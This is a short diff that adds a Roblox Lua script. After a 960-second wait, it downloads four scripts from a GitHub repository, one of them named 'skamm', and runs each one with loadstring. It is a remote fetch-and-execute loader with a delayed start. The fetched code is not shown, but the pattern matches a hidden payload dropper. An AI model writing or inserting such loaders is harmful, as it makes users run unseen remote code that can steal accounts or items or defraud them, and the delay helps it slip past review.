@@ -1,0 +1,8 @@
+wait(960)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brawlotik/boblox/refs/heads/main/skamm"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brawlotik/boblox/refs/heads/main/sum"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brawlotik/boblox/refs/heads/main/fps1"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brawlotik/boblox/refs/heads/main/fps2"))()
